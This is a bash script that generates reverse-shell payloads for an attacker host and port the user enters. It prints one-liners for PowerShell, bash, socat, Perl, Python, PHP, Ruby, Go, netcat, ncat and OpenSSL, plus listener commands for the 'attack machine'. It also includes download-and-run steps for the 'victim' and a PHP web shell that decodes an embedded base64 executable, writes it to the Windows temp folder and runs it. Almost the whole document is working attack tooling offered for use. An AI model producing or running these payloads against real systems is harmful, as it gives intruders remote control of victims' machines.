#!/bin/bash
#just chmod +x thisfile.sh and run it chief 

set -e
read -p "who are you? " host
read -p "got a port for that chief? " port
printf "\nPSHELL\n"

echo "\$client = New-Object System.Net.Sockets.TCPClient('$host',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"

echo "\$sm=(New-Object Net.Sockets.TCPClient('$host',$port)).GetStream();[byte[]]\$bt=0..65535|%{0};while((\$i=\$sm.Read(\$bt,0,\$bt.Length)) -ne 0){;\$d=(New-Object Text.ASCIIEncoding).GetString(\$bt,0,\$i);\$st=([text.encoding]::ASCII).GetBytes((iex \$d 2>&1));\$sm.Write(\$st,0,\$st.Length)}" 

printf "\n"

echo "\\\$client = New-Object System.Net.Sockets.TCPClient('$host',$port);\\\$stream = \\\$client.GetStream();[byte[]]\\\$bytes = 0..65535|%{0};while((\\\$i = \\\$stream.Read(\\\$bytes, 0, \\\$bytes.Length)) -ne 0){;\\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\\$bytes,0, \\\$i);\\\$sendback = (iex \\\$data 2>&1 | Out-String );\\\$sendback2  = \\\$sendback + 'PS ' + (pwd).Path + '> ';\\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\\$sendback2);\\\$stream.Write(\\\$sendbyte,0,\\\$sendbyte.Length);\\\$stream.Flush()};\\\$client.Close()"

echo "\\\$sm=(New-Object Net.Sockets.TCPClient('$host',$port)).GetStream();[byte[]]\\\$bt=0..65535|%{0};while((\\\$i=\\\$sm.Read(\\\$bt,0,\\\$bt.Length)) -ne 0){;\\\$d=(New-Object Text.ASCIIEncoding).GetString(\\\$bt,0,\\\$i);\\\$st=([text.encoding]::ASCII).GetBytes((iex \\\$d 2>&1));\\\$sm.Write(\\\$st,0,\\\$st.Length)}" 

printf "\nBASH TCP\n"

echo "bash -i >& /dev/tcp/$host/$port 0>&1"

printf "\n"

echo "0<&196;exec 196<>/dev/tcp/$host/$port; sh <&196 >&196 2>&196"

echo "BASH UDP"

echo "sh -i >& /dev/udp/$host/$port 0>&1"

echo "VVVVVVVVVVVVV"

echo "USE nc -u -lvp $port with this one"

printf "\nSOCAT\n"

echo "ATTACK MACHINE"

echo "socat file:`tty`,raw,echo=0 TCP-L:$port"

echo "VICTIM MACHINE"

printf "\n"
echo "sudo curl https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -o /var/www/html/socat"
printf "\n"

echo "/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$host:$port"

echo "wget -q http://$host/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$host:$port" 

printf "\nPERL\n"

echo "perl -e 'use Socket;\$i=\"$host\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

printf "\n"

echo "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$host:$port\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'"

printf "\n"

echo "perl -e 'use Socket;\\\$i=\\\"$host\\\";\\\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in(\\\$p,inet_aton(\\\$i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");};'"

printf "\n"

echo "perl -MIO -e '\\\$p=fork;exit,if(\\\$p);\\\$c=new IO::Socket::INET(PeerAddr,\\\"$host:$port\\\");STDIN->fdopen(\\\$c,r);\\\$~->fdopen(\\\$c,w);system\\\$_ while<>;'"


echo "WINDOWS ONLY"

echo "perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$host:$port\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'"

printf "\n"

echo "perl -MIO -e '\\\$c=new IO::Socket::INET(PeerAddr,\\\"$host:$port\\\");STDIN->fdopen(\\\$c,r);\\\$~->fdopen(\\\$c,w);system\\\$_ while<>;'"

printf "\nPYTHON\n"

echo "LINUX"

echo "export RHOST=\"$host\";export RPORT=$port;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"

printf "\n"

echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"

printf "\n"


echo "export RHOST=\\\"$host\\\";export RPORT=$port;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\\\"RHOST\\\"),int(os.getenv(\\\"RPORT\\\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\\"/bin/sh\\\")'"

printf "\n"

echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$host\\\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\\"/bin/bash\\\")'"


echo "WINDOWS"

echo "C:\\Python27\\python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('$host', $port)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\""

printf "\n"


echo "C:\\\\Python27\\\\python.exe -c \\\"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('$host', $port)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\\\""

printf "\nPHP\n"

echo "php -r '\$sock=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"


echo "php -r '\$sock=fsockopen(\"$host\",$port);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

echo "php -r '\$sock=fsockopen(\"$host\",$port);system(\"/bin/sh -i <&3 >&3 2>&3\");'"

echo "php -r '\$sock=fsockopen(\"$host\",$port);passthru(\"/bin/sh -i <&3 >&3 2>&3\");'"

echo "php -r '\$sock=fsockopen(\"$host\",$port);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'"

echo "php -r '\$sock=fsockopen(\"$host\",$port);\$proc=proc_open(\"/bin/sh -i\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);'"

printf "\n"


echo "php -r '\\\$sock=fsockopen(\\\"$host\\\",$port);exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'"


echo "php -r '\\\$sock=fsockopen(\\\"$host\\\",$port);shell_exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'"

echo "php -r '\\\$sock=fsockopen(\\\"$host\\\",$port);system(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'"

echo "php -r '\\\$sock=fsockopen(\\\"$host\\\",$port);passthru(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'"

echo "php -r '\\\$sock=fsockopen(\\\"$host\\\",$port);popen(\\\"/bin/sh -i <&3 >&3 2>&3\\\", \\\"r\\\");'"

echo "php -r '\\\$sock=fsockopen(\\\"$host\\\",$port);\\\$proc=proc_open(\\\"/bin/sh -i\\\", array(0=>\\\$sock, 1=>\\\$sock, 2=>\\\$sock),\\\$pipes);'"


printf "\nRUBY\n"

echo "ruby -rsocket -e'f=TCPSocket.open(\"$host\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

echo "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$host\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"

printf "\n"

echo "ruby -rsocket -e'f=TCPSocket.open(\\\"$host\\\",$port).to_i;exec sprintf(\\\"/bin/sh -i <&%d >&%d 2>&%d\\\",f,f,f)'"

echo "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\\\"$host\\\",\\\"$port\\\");while(cmd=c.gets);IO.popen(cmd,\\\"r\\\"){|io|c.print io.read}end'"

echo "WINDOWS ONLY"

echo "ruby -rsocket -e 'c=TCPSocket.new(\"$host\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"

printf "\n"

echo "ruby -rsocket -e 'c=TCPSocket.new(\\\"$host\\\",\\\"$port\\\");while(cmd=c.gets);IO.popen(cmd,\\\"r\\\"){|io|c.print io.read}end'"

printf "\nGOLANG\n"

echo "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$host:$port\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"

printf "\n"

echo "echo 'package main;import\\\"os/exec\\\";import\\\"net\\\";func main(){c,_:=net.Dial(\\\"tcp\\\",\\\"$host:$port\\\");cmd:=exec.Command(\\\"/bin/sh\\\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"

printf "\nNC TRAD\n"

echo "nc -e /bin/sh $host $port"

echo "nc -e /bin/bash $host $port"

echo "nc -c bash $host $port"

echo "NCAT OPENBSD"

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $host $port >/tmp/f"

echo "NCAT"

echo "ncat $host $port -e /bin/bash"

echo "ncat --udp $host $port -e /bin/bash"

printf "\nOPENSSL\n"

echo "attacking machine"

echo "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes"

echo "openssl s_server -quiet -key key.pem -cert cert.pem -port $port"

echo "or"

echo "ncat --ssl -vv -l -p $port"

echo "victim"

echo "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $host:$port > /tmp/s; rm /tmp/s"

printf "\nEXTRA POWERSHELL\n"

echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$host\",$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"

printf "\n"

echo "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$host',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""

printf "\n"


echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\\\"$host\\\",$port);\\\$stream = \\\$client.GetStream();[byte[]]\\\$bytes = 0..65535|%{0};while((\\\$i = \\\$stream.Read(\\\$bytes, 0, \\\$bytes.Length)) -ne 0){;\\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\\$bytes,0, \\\$i);\\\$sendback = (iex \\\$data 2>&1 | Out-String );\\\$sendback2  = \\\$sendback + \\\"PS \\\" + (pwd).Path + \\\"> \\\";\\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\\$sendback2);\\\$stream.Write(\\\$sendbyte,0,\\\$sendbyte.Length);\\\$stream.Flush()};\\\$client.Close()"

printf "\n"

echo "powershell -nop -c \\\"\\\$client = New-Object System.Net.Sockets.TCPClient('$host',$port);\\\$stream = \\\$client.GetStream();[byte[]]\\\$bytes = 0..65535|%{0};while((\\\$i = \\\$stream.Read(\\\$bytes, 0, \\\$bytes.Length)) -ne 0){;\\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\\$bytes,0, \\\$i);\\\$sendback = (iex \\\$data 2>&1 | Out-String );\\\$sendback2 = \\\$sendback + 'PS ' + (pwd).Path + '> ';\\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\\$sendback2);\\\$stream.Write(\\\$sendbyte,0,\\\$sendbyte.Length);\\\$stream.Flush()};\\\$client.Close()\\\""

printf "\n"

echo "curl https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1 -o /tmp/minrev.ps1"
echo "sed -i \"s#127.0.0.1#$host#g\" /tmp/minrev.ps1"
echo "sed -i \"s#413#$port#g\" /tmp/minrev.ps1"
echo "sudo cp /tmp/minrev.ps1 /var/www/html/"

printf "\n"

echo "<\?php
header('Content-type: text/plain');
\$ip   = \"$host\"; //change this 
\$port = \"$port\"; //change this
\$payload = \"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\";
\$evalCode = gzinflate(base64_decode(\$payload));
\$evalArguments = \" \".\$port.\" \".\$ip;
\$tmpdir =\"C:\\windows\\temp\";
chdir(\$tmpdir);
\$res .= \"Using dir : \".\$tmpdir;
\$filename = \"D3fa1t_shell.exe\";
\$file = fopen(\$filename, 'wb');
fwrite(\$file, \$evalCode);
fclose(\$file);
\$path = \$filename;
\$cmd = \$path.\$evalArguments;
\$res .= \"\n\nExecuting : \".\$cmd.\"\n\";
echo \$res;
\$output = system(\$cmd);
			            
\?>"

printf "\n"

